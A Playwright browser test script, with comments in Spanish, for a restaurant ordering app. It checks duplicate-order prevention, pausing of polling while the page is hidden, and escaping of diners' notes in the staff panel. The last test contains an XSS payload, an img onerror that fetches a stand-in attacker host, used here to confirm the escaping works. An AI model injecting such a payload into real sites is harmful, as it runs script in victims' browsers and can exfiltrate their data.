/* Verifica los arreglos de seguridad y confiabilidad del lado del navegador.
   Corre con el servidor local levantado:  python3 -m http.server 8899   */
import { chromium } from 'playwright';
const U = 'http://localhost:8899';
const nav = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium' });
let fallas = 0;
const ok = (b, t) => { console.log((b ? '  ✓ ' : '  ✗ ') + t); if (!b) fallas++; };

// ---------- 1. Doble toque no manda dos comandas ----------
{
  const ctx = await nav.newContext({ viewport: { width: 420, height: 900 } });
  const pg = await ctx.newPage();
  const posts = [];
  /* El menu va en el stub a proposito: si el platillo no existe en PLATILLOS, enviarOrden
     revienta al buscarle el nombre y la prueba pasaria por la razon equivocada (0 comandas
     porque nunca llego al envio, no porque el candado funcionara). */
  const CFG = {
    config: { marca: { nombre: 'Flautas' }, negocio: 'restaurante' },
    platillos: [{ id: 'guacamole', nombre: 'Guacamole', precio: 95, cat: 'entradas', desc: 'x' },
                { id: 'agua', nombre: 'Agua fresca', precio: 40, cat: 'bebidas', desc: 'x' }],
  };
  await pg.route('**/rest/v1/**', async r => {
    const m = r.request().method(), u = r.request().url();
    let body = '[]';
    if (u.includes('menusbot_config')) body = JSON.stringify([{ id: 'flautas-el-crunch', data: CFG }]);
    if (m !== 'GET') {
      if (u.includes('menusbot_ordenes')) posts.push(u);
      // lento a proposito: es la ventana en la que cabe el segundo toque
      await new Promise(s2 => setTimeout(s2, 900));
    }
    if (m === 'POST' && u.includes('menusbot_ordenes')) body = JSON.stringify([{ id: 9999 }]);
    if (m === 'POST' && u.includes('menusbot_mesas_abiertas')) body = JSON.stringify([{ id: 77, codigo: '1234', dispositivo_id: 'x', invitados: [] }]);
    await r.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body });
  });
  await pg.route('**/functions/v1/**', r => r.fulfill({ status: 200, body: '{}' }));
  await pg.goto(`${U}/carta.html?mesa=1&r=flautas-el-crunch`);
  await pg.waitForTimeout(3000);
  await pg.evaluate(() => { const s2 = document.getElementById('splash'); if (s2) s2.classList.add('oculto'); });
  await pg.waitForTimeout(400);
  await pg.evaluate(async () => {
    pedido = [{ id: 'guacamole', qty: 1, notas: '' }];
    sinBebidasOk = true;
    enviarOrden(); enviarOrden(); enviarOrden();   // tres toques seguidos
    await new Promise(r => setTimeout(r, 3000));
  });
  await pg.waitForTimeout(500);
  ok(posts.length === 1, `tres toques -> ${posts.length} comanda(s) enviada(s) (debe ser exactamente 1)`);
  await ctx.close();
}

// ---------- 2. El sondeo se detiene con la pantalla oculta ----------
{
  const ctx = await nav.newContext({ viewport: { width: 390, height: 844 } });
  const pg = await ctx.newPage();
  let lecturas = 0;
  await pg.route('**/rest/v1/**', r => {
    if (r.request().method() === 'GET') lecturas++;
    return r.fulfill({ status: 200, contentType: 'application/json', body: '[]' });
  });
  await pg.goto(`${U}/carta.html?mesa=1&r=flautas-el-crunch`, { waitUntil: 'domcontentloaded' });
  await pg.waitForTimeout(1000);
  const tieneEscucha = await pg.evaluate(() => {
    document.dispatchEvent(new Event('visibilitychange'));
    return true;
  });
  await pg.evaluate(() => Object.defineProperty(document, 'hidden', { get: () => true, configurable: true }));
  await pg.evaluate(() => document.dispatchEvent(new Event('visibilitychange')));
  const antes = lecturas;
  await pg.waitForTimeout(9000);          // 9 s = mas de dos vueltas de sondeo
  ok(lecturas - antes === 0, `oculta 9s -> ${lecturas - antes} peticiones (deben ser 0)`);
  await pg.evaluate(() => Object.defineProperty(document, 'hidden', { get: () => false, configurable: true }));
  await pg.evaluate(() => document.dispatchEvent(new Event('visibilitychange')));
  await pg.waitForTimeout(1500);
  ok(lecturas > antes, 'al volver a verse, vuelve a sincronizar');
  await ctx.close();
}

// ---------- 3. La nota del comensal no ejecuta codigo en el panel ----------
{
  const ctx = await nav.newContext({ viewport: { width: 1280, height: 900 } });
  const pg = await ctx.newPage();
  let ejecuto = false;
  pg.on('request', r => { if (r.url().includes('evil.tld')) ejecuto = true; });
  await pg.goto(`${U}/panel.html`, { waitUntil: 'domcontentloaded' });
  await pg.waitForTimeout(800);
  const pintado = await pg.evaluate(() => {
    const nota = '<img src=x onerror="fetch(\'https://evil.tld/robo\')">';
    const d = document.createElement('div');
    // se pinta por el mismo camino que usa el tablero de comandas
    d.innerHTML = `<span>${escTxt('Guacamole')}<small>— ${escTxt(nota)}</small></span>`;
    document.body.appendChild(d);
    return d.textContent.includes('<img');
  });
  await pg.waitForTimeout(1200);
  ok(!ejecuto, 'la nota maliciosa NO ejecuta codigo');
  ok(pintado, 'la nota se ve como texto, tal cual la escribio el comensal');
  await ctx.close();
}

await nav.close();
console.log(fallas ? `\nFALLAS: ${fallas}` : '\nTodo bien.');
process.exit(fallas ? 1 : 0);
